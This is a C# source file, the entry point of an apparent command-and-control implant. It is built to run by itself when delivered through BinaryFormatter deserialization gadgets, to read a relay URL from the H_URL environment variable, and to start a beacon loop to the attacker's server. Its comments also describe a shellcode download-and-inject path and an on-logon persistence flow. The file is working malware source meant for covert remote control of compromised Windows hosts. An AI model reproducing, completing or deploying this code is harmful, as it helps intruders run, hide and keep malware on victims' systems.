using System;
using System.Runtime.InteropServices;
using System.Net;

namespace CSharpAgent
{
    // The deserialization entry point (COM-visible so the C2-delivered BinaryFormatter gadgets
    // can instantiate the type; the static constructor fires on Activator.CreateInstance /
    // CreateInstance(entryClass) — both instantiation forms run it). MUST stay the FIRST public
    // type in the merged source: the C2's entry-class finder takes the first public class, and
    // the promotion pass moves it after <Module> for the GetTypes()[0] gadgets.
    //
    // Dual-mode dispatch, decided by the process environment the host left us:
    //
    //   H_URL set → agent mode. Beacon.Run() parks THIS thread in the beacon loop and never
    //               returns on its own — the deserialization that started us (a 0x0B UpgradeNetFramework
    //               delivered to the JScript agent sharing this machine) never resumes its own
    //               loop, so exactly one agent beacons the shared MachineGuid session from here
    //               on. Run returns only on a fatal transport failure, unwinding back into the
    //               JScript agent underneath (which then resumes beaconing as the fallback).
    //   A_URL set → legacy one-shot injector: download the PIC bytes and inject them (the
    //               Persistence Manager's on-logon flow depends on this path — it sets A_URL
    //               and deserializes the same assembly).
    //   neither   → return. Standalone builds carry nothing baked (see C2Payload).
    [ComVisible(true)]
    public class Program
    {
        static Program()
        {
            Main();
        }

        // The release EXE builds (csharp-agent-<net2|net4>-<arch>.exe siblings of the DLLs)
        // reach this type through the runtime entry point, which calls Main AFTER the static
        // ctor already did — without the guard a direct run would execute the body twice.
        // The ctor's call is the ONLY entry the deserialization path has (a Library has no
        // managed entry point), so both forms share the body; the guard makes it run exactly
        // once either way.
        static bool _entered;

        static void Main()
        {
            if (_entered) return;
            _entered = true;

#if DEBUG
            // [1] — proves the type initialized and the body is running (exe entry OR
            // deserialization ctor; if a Win7 run dies BEFORE this line, the failure is in
            // type init itself — JIT/permission/mask — not in the beacon).
            Diag.Show("[1] start", "process started — type initialized, Main entered");
#endif

            var beaconUrl = Environment.GetEnvironmentVariable("H_URL");
            if (string.IsNullOrEmpty(beaconUrl))
            {
#if DEBUG
                // The silent exit that WAS "runs then exits": launched without H_URL.
                Diag.Show("[exit] no H_URL",
                    "H_URL is not set — nothing to beacon, returning. Launch from a shell " +
                    "that has it: set H_URL=https://<relay>/ && csharp-agent-<net2>-<arch>.exe");
#endif
                return;
            }
#if DEBUG
            Diag.Show("[2] H_URL", beaconUrl);
#endif

            // A URL never legitimately carries control/format chars or edge whitespace —
            // a copy-pasted H_URL with an invisible U+200B or a cmd `&&` trailing space
            // must not reach WebRequest. Same low-byte rule the identity headers use
            // (Identity's WireSafe logic inline — Main runs before any header exists).
            var wireUrl = beaconUrl.Trim();
            for (var i = wireUrl.Length - 1; i >= 0; i--)
            {
                var b = wireUrl[i] & 0xFF;
                if ((b < 0x20 && b != 0x09) || b == 0x7F) wireUrl = wireUrl.Remove(i, 1);
            }
            if (wireUrl.Length == 0)
            {
#if DEBUG
                Diag.Show("[exit] H_URL blank", "H_URL carried only whitespace/control chars — nothing to beacon");
#endif
                return;
            }

            Beacon.Run(wireUrl);
#if DEBUG
            Diag.Show("[exit] Run returned",
                "Beacon.Run returned — a fatal transport/protocol exit (see the last [exit] " +
                "line above this one, if any). Process ends; the JScript agent underneath " +
                "resumes when this run was a deserialization.");
#endif
        }
    }
}
